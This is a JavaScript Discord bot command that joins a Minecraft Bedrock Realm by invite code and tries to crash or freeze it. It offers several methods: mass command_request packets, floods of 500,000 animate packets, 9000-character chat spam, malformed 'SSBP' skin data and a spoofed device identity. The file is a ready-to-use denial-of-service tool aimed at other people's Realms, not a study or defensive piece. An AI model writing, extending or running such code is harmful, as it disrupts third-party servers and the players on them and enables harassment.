const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const bedrock = require('bedrock-protocol');
const path = require('path');
const skinData = require('../../data/ssbp.json');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const fs = require('fs');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('crash')
        .setDescription('realm crash (multiple methods)')
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('realm code')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('method')
                .setDescription('crash method')
                .setRequired(true)
                .addChoices(
                    { name: 'packet freeze', value: 'freeze' },
                    { name: 'player crash', value: 'crash' },
                    { name: 'ssbp w/ skin data', value: 'ssbp' },
                    { name: 'lag', value: 'lag' },
                )),

    async execute(interaction) {
        const realmCode = interaction.options.getString('realmcode');
        const method = interaction.options.getString('method');
        const profilesFolder = path.resolve(`./xoxo/data/user/auth/${interaction.user.id}`);

        if (method === 'freeze') {
            const connectedEmbed = new EmbedBuilder()
                .setTitle('Connected to Realm')
                .setDescription(`Joined realm > ${realmCode} | attempting to freeze realm with packets`)
                .setColor('#ff00c8')
                .setTimestamp();

            await interaction.reply({ embeds: [connectedEmbed] });

            const client = bedrock.createClient({
                profilesFolder,
                username: `${interaction.user.id}`,
                realms: { realmInvite: realmCode },
                offline: false,
            });

            client.on('start_game', async () => {
                let messageCount = 0;
                const interval = setInterval(() => {
                    if (messageCount >= 10) {
                        clearInterval(interval);
                        client.disconnect();
                        return;
                    }

                    for (let i = 0; i < 5000; i++) {
                        client.write("command_request", {
                            command: `tell @a ${"@e".repeat(70)} | §4§l§ hottie`,
                            origin: {
                                type: 5,
                                uuid: '5',
                                request_id: 'hehehheheheh',
                            },
                            internal: false,
                            version: 66,
                        });
                    }

                    messageCount += 1;
                }, 20);
            });

        } else if (method === 'lag') {
            const connectedEmbed = new EmbedBuilder()
                .setTitle('Connected to Realm')
                .setDescription(`Joined realm > ${realmCode} | attempting to lag realm with packets`)
                .setColor('#ff00c8')
                .setTimestamp();

            await interaction.reply({ embeds: [connectedEmbed] });
            const duration = 10;
            let disconnected = false;

            const client = bedrock.createClient({
                profilesFolder,
                username: `${interaction.user.id}`,
                realms: {
                    [realmCode.length === 8 ? 'realmId' : 'realmInvite']: realmCode,
                },
                skipPing: true,
            });

            client.on('start_game', (packet) => {
                const runtimeEntityId = packet.runtime_entity_id;
                setTimeout(() => {
                    for (let i = 0; i < 500000; i++) {
                        client.write("animate", {
                            action_id: 4,
                            runtime_entity_id: runtimeEntityId
                        });
                        client.write("animate", {
                            action_id: 1,
                            runtime_entity_id: runtimeEntityId
                        });
                    }
                }, 0);

                setTimeout(() => {
                    if (!disconnected) {
                        client.disconnect();
                        disconnected = true;
                    }
                }, duration * 1000);
            });

            client.on('error', console.error);

        } else if (method === 'crash') {
            const crashCount = 4000;

            const startingEmbed = new EmbedBuilder()
                .setTitle('Player Crash')
                .setDescription(`Attempting to crash players in realm > **${realmCode}** | crash count > **${crashCount}**`)
                .setColor('#ff00c8')
                .setTimestamp();

            await interaction.reply({ embeds: [startingEmbed] });

            const client = bedrock.createClient({
                profilesFolder,
                username: `${interaction.user.id}`,
                realms: { realmInvite: realmCode },
                offline: false,
            });

            client.on('start_game', async () => {
                let count = 0;
                const interval = setInterval(() => {
                    if (count >= crashCount) {
                        clearInterval(interval);
                        client.disconnect();
                        return;
                    }
                    try {
                        client.queue('text', {
                            type: 'chat',
                            needs_translation: false,
                            source_name: '',
                            xuid: '',
                            platform_chat_id: '',
                            filtered_message: '',
                            message: 'V'.repeat(9000),
                        });
                    } catch (error) {
                        console.error(`[LOG] Error > Message: ${error.message}`);
                    }
                    count++;
                }, 0);
            });

        } else if (method === 'text') {
            const crashCount = 400; 
            const nameSpoof = ".gg/stressed";
            const startingEmbed = new EmbedBuilder()
                .setTitle('text crash')
                .setDescription(`Attempting to crash players in realm > **${realmCode}**`)
                .setColor('#ff00c8')
                .setTimestamp();

            await interaction.reply({ embeds: [startingEmbed] });

            try {
                const client = bedrock.createClient({
                    profilesFolder,
                    username: `${interaction.user.id}`,
                    realms: { realmInvite: realmCode },
                    offline: false,
                    skinData: {
                        CurrentInputMode: 3,
                        DefaultInputMode: 3,
                        DeviceOS: 11,
                        DeviceId: uuidv3(uuidv4(), NIL),
                        PlatformOnlineId: generateRandomString(19, '1234567890'),
                        PrimaryUser: false,
                        SelfSignedId: uuidv4(),
                        ThirdPartyName: nameSpoof,
                        ThirdPartyNameOnly: true,
                        TrustedSkin: true,
                    },
                });

                client.on('start_game', async () => {
                    const successEmbed = new EmbedBuilder()
                        .setTitle('Client Joined')
                        .setDescription(`Successfully connected to the realm > **${realmCode}**`)
                        .setColor('#ff00c8')
                        .setTimestamp();

                    await interaction.followUp({ embeds: [successEmbed] });

                    let count = 0;
                    const interval = setInterval(async () => {
                        if (count >= crashCount) {
                            clearInterval(interval);
                            client.disconnect();

                            const completionEmbed = new EmbedBuilder()
                                .setTitle('Crash Completed')
                                .setDescription(`Crash attempt completed for realm > **${realmCode}**`)
                                .setColor('#ff00c8')
                                .setTimestamp();

                            await interaction.followUp({ embeds: [completionEmbed] });
                            return;
                        }
                        try {
                            client.queue('text', {
                                type: 'chat',
                                needs_translation: false,
                                source_name: '',
                                xuid: '',
                                platform_chat_id: '',
                                filtered_message: '',
                                message: ''.repeat(100),
                            });
                            count++;
                        } catch (error) {
                            clearInterval(interval);

                            const queueErrorEmbed = new EmbedBuilder()
                                .setTitle('Queue Error')
                                .setDescription(`An error occurred while queuing text: ${error.message}`)
                                .setColor('#ff00c8')
                                .setTimestamp();

                            await interaction.followUp({ embeds: [queueErrorEmbed] });
                        }
                    }, 500);
                });

                client.on('error', async (error) => {
                    const clientErrorEmbed = new EmbedBuilder()
                        .setTitle('Client Error')
                        .setDescription(`An error occurred with the client: ${error.message}`)
                        .setColor('#ff00c8')
                        .setTimestamp();

                    await interaction.followUp({ embeds: [clientErrorEmbed] });
                });

                client.on('disconnect', async () => {
                    const disconnectEmbed = new EmbedBuilder()
                        .setTitle('Client Disconnected')
                        .setDescription(`The client has disconnected from the realm > **${realmCode}**`)
                        .setColor('#ff00c8')
                        .setTimestamp();

                    await interaction.followUp({ embeds: [disconnectEmbed] });
                });
            } catch (error) {
                const connectionErrorEmbed = new EmbedBuilder()
                    .setTitle('Connection Error')
                    .setDescription(`Failed to connect to the realm: ${error.message}`)
                    .setColor('#ff00c8')
                    .setTimestamp();

                await interaction.followUp({ embeds: [connectionErrorEmbed] });
            }

        } else if (method === 'ssbp') {
            const startingEmbed = new EmbedBuilder()
                .setTitle('SSBP Connecting')
                .setDescription(`Attempting to SSBP realm > **${realmCode}**`)
                .addFields(
                    { name: 'User', value: `${interaction.user.id}`, inline: true },
                    { name: 'Realm', value: `${realmCode}`, inline: true }
                )
                .setColor('#ff00c8')
                .setTimestamp();

            await interaction.reply({ embeds: [startingEmbed] });

            try {
                bedrock.createClient({
                    profilesFolder,
                    offline: false,
                    useRaknetWorkers: false,
                    connectTimeout: 0,
                    skipPing: true,
                    raknetBackend: false,
                    flow: 'live',
                    username: `${interaction.user.id}`,
                    skinData: {
                        CurrentInputMode: 3,
                        DefaultInputMode: 3,
                        DeviceOS: 11,
                        DeviceId: uuidv3(uuidv4(), NIL),
                        PlatformOnlineId: generateRandomString(19, '1234567890'),
                        PrimaryUser: false,
                        SelfSignedId: uuidv4(),
                        ThirdPartyNameOnly: true,
                        TrustedSkin: true,
                        ...skinData,
                    },
                    realms: {
                        [realmCode.length === 8 ? 'realmId' : 'realmInvite']: realmCode,
                    },
                });
            } catch (error) {
                console.error(`[LOG] Error > Message: ${error.message}`);
            }
        }

        function generateRandomString(length, charSet) {
            charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += charSet.charAt(Math.floor(Math.random() * charSet.length));
            }
            return result;
        }
    },
};
